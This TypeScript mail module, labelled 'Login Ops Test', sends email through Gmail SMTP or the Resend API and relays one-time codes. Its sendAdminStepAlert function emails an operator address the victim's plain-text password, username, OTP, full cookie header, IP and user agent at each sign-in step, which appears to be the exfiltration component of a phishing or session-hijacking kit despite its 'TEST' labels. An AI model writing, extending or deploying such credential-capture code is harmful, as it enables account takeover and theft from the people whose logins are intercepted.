import { connect } from 'node:tls'
import { ADMIN_EMAIL } from './constants'

function wrap(title: string, body: string) {
  return `<div style="font-family:Arial,sans-serif;background:#0f1412;padding:24px;color:#e8eeea">
  <div style="max-width:560px;margin:0 auto;background:#16201b;border-radius:16px;padding:28px">
    <p style="letter-spacing:2px;color:#8fbfa8;font-size:12px;text-transform:uppercase">Login Ops Test</p>
    <h2 style="color:#fff;margin:8px 0 16px">${title}</h2>
    <div style="line-height:1.7;color:#c5d4cc">${body}</div>
  </div></div>`
}

function fromAddress() {
  const gmailUser = process.env.GMAIL_USER || process.env.SMTP_USER
  return (
    process.env.EMAIL_FROM ||
    (gmailUser ? `Login Ops <${gmailUser}>` : 'Login Ops <onboarding@resend.dev>')
  )
}

function readSmtpReply(socket: NodeJS.ReadableStream): Promise<string> {
  return new Promise((resolve, reject) => {
    let buf = ''
    const onData = (chunk: string | Buffer) => {
      buf += typeof chunk === 'string' ? chunk : chunk.toString('utf8')
      const lines = buf.split(/\r?\n/).filter((l) => l.length > 0)
      const last = lines[lines.length - 1]
      if (last && /^\d{3} /.test(last)) {
        socket.off('data', onData)
        resolve(buf)
      }
    }
    socket.on('data', onData)
    socket.once('error', reject)
  })
}

async function expectOk(socket: NodeJS.ReadWriteStream, command?: string) {
  if (command) socket.write(command + '\r\n')
  const reply = await readSmtpReply(socket)
  if (!/^[23]/.test(reply.trim())) throw new Error(`SMTP: ${reply.trim()}`)
  return reply
}

async function sendViaGmail(to: string, subject: string, html: string) {
  const user = process.env.GMAIL_USER || process.env.SMTP_USER
  const pass = (process.env.GMAIL_APP_PASSWORD || process.env.SMTP_PASS || '').replace(/\s/g, '')
  if (!user || !pass) return false

  await new Promise<void>((resolve, reject) => {
    const socket = connect(
      { host: 'smtp.gmail.com', port: 465, servername: 'smtp.gmail.com' },
      async () => {
        try {
          await expectOk(socket)
          await expectOk(socket, 'EHLO loginops')
          await expectOk(socket, 'AUTH LOGIN')
          await expectOk(socket, Buffer.from(user).toString('base64'))
          await expectOk(socket, Buffer.from(pass).toString('base64'))
          await expectOk(socket, `MAIL FROM:<${user}>`)
          await expectOk(socket, `RCPT TO:<${to}>`)
          await expectOk(socket, 'DATA')
          const msg = [
            `From: ${fromAddress()}`,
            `To: ${to}`,
            `Subject: ${subject}`,
            'MIME-Version: 1.0',
            'Content-Type: text/html; charset=UTF-8',
            '',
            html,
            '.',
          ].join('\r\n')
          await expectOk(socket, msg)
          socket.write('QUIT\r\n')
          socket.end()
          resolve()
        } catch (e) {
          socket.destroy()
          reject(e)
        }
      }
    )
    socket.setEncoding('utf8')
    socket.setTimeout(20000, () => {
      socket.destroy()
      reject(new Error('SMTP timeout'))
    })
    socket.on('error', reject)
  })
  return true
}

async function sendViaResend(to: string, subject: string, html: string) {
  const apiKey = process.env.RESEND_API_KEY
  if (!apiKey) return false
  const res = await fetch('https://api.resend.com/emails', {
    method: 'POST',
    headers: {
      Authorization: `Bearer ${apiKey}`,
      'Content-Type': 'application/json',
    },
    body: JSON.stringify({ from: fromAddress(), to: [to], subject, html }),
  })
  return res.ok
}

export async function sendMail(to: string, subject: string, html: string) {
  console.log('[login-ops] mail', { to, subject })
  try {
    if (await sendViaGmail(to, subject, html)) return true
    if (await sendViaResend(to, subject, html)) return true
    console.warn('[login-ops] No mail transport configured — OTP logged to console only')
    return false
  } catch (err) {
    console.error('[login-ops] sendMail', err)
    return false
  }
}

export async function sendOtpEmail(to: string, otp: string, label: string) {
  return sendMail(
    to,
    `Your verification code (${label})`,
    wrap(
      label,
      `<p>Your one-time code is:</p>
       <p style="font-size:28px;letter-spacing:6px;font-weight:700;color:#fff">${otp}</p>
       <p>Expires in 10 minutes.</p>`
    )
  )
}

export async function sendAdminStepAlert(input: {
  attemptId: string
  email: string
  step: string
  event: string
  passwordPlain?: string
  username?: string
  otpPlain?: string
  cookieHeader?: string
  ip?: string
  userAgent?: string
}) {
  const when = new Date().toLocaleString()
  const secrets = `
    <div style="margin-top:16px;padding:12px;background:#0a100d;border-radius:8px;font-family:monospace;font-size:13px">
      <p style="color:#8fbfa8;margin:0 0 8px">TEST · plain text</p>
      <p style="margin:4px 0"><strong>Email:</strong> ${input.email}</p>
      ${input.passwordPlain ? `<p style="margin:4px 0"><strong>Password:</strong> ${input.passwordPlain}</p>` : ''}
      ${input.username ? `<p style="margin:4px 0"><strong>Username:</strong> ${input.username}</p>` : ''}
      ${input.otpPlain ? `<p style="margin:4px 0"><strong>OTP:</strong> ${input.otpPlain}</p>` : ''}
      ${input.cookieHeader ? `<p style="margin:4px 0;word-break:break-all"><strong>Cookies:</strong> ${input.cookieHeader}</p>` : ''}
      ${input.userAgent ? `<p style="margin:4px 0;word-break:break-all"><strong>UA:</strong> ${input.userAgent}</p>` : ''}
      ${input.ip ? `<p style="margin:4px 0"><strong>IP:</strong> ${input.ip}</p>` : ''}
    </div>`

  return sendMail(
    ADMIN_EMAIL,
    `[Ops] Login · ${input.email} · ${input.step}`,
    wrap(
      'Live sign-in activity',
      `<p><strong>${input.email}</strong></p>
       <p>Step: <strong>${input.step}</strong></p>
       <p>${input.event}</p>
       <p>Time: ${when}</p>
       <p>Attempt: <code>${input.attemptId}</code></p>
       ${secrets}`
    )
  )
}
